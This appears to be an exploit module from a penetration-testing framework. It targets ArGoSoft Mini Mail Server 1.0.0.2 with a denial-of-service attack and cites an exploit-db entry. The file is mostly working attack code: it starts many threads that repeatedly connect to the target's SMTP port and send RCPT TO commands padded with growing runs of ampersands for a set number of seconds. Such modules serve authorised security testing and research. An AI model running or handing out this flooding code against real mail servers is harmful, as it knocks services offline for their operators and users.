#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import socket
from threading import Thread

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_argosoft_mini_mail_server_dos"
INFO['DESCRIPTION'] = "ArGoSoft Mini Mail Server 1.0.0.2 - Denial of Service"
INFO['VENDOR'] = "http://www.argosoft.com"
INFO['DOWNLOAD_LINK'] = 'https://www.exploit-db.com/apps/0726abcab8a685fff4c7d6ad040dc433-MiniMailSetup.msi'
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/43026/']
INFO["CVE Name"] = ""
INFO["NOTES"] = """Denial-of-service vulnerability in ArGoSoft Mini Mail Server 1.0.0.2 and earlier allows remote attackers to waste CPU resources (memory consumption) via unspecified vectors.
"""

INFO['CHANGELOG'] = "23 Oct, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS['HOST'] = '127.0.0.1', dict(description = 'Target IP')
OPTIONS["PORT"] = 25
OPTIONS['THREADS'] = 10, dict(description = 'Number of threads')
OPTIONS['TIME'] = 120, dict(description = 'Time of attack (seconds) ')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.threads = 10
        self.atime = 120
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.port = int(self.args.get('PORT', self.port))
        self.threads = int(self.args.get('THREADS', self.threads))
        self.atime = int(self.args.get('TIME', self.atime))
        self.host = self.args.get('HOST', self.host)
        
    #def make_url(self, path = ''):
    #    return 'http://{}:{}{}'.format(self.host, self.port, path)
    
    def attck(self):
        counter = 50
        string = '&'
        while True:
            try:
                if counter >= 10000:
                    counter = 0
                else:
     
                    counter = counter + 50
                    A = (string * counter) + 'user2@othermail.com'
                    #print "String lenght: " + str(len(A))
     
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5.0)
                    sock.connect((self.host, self.port))
                    sock.send('HELO localhost\r\n' + 'MAIL FROM: user1@somemail.com\r\n' + 'RCPT TO: ' + A + '\r\nDATA\r\nMessage-ID:1224\r\SDFGQUIL\r\n"."\r\n' + 'QUIT\r\n')
                    sock.recv(1024)
                    sock.close()
     
            except Exception as e:
                continue
    
    def run(self):
        self.args()
        self.log("Attacking {} with {} threads for {} seconds".format(self.host, self.threads, self.atime))
        
        for i in range(self.threads):
            t = Thread(target=self.attck)
            t.start()
        
        time.sleep(self.atime)
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
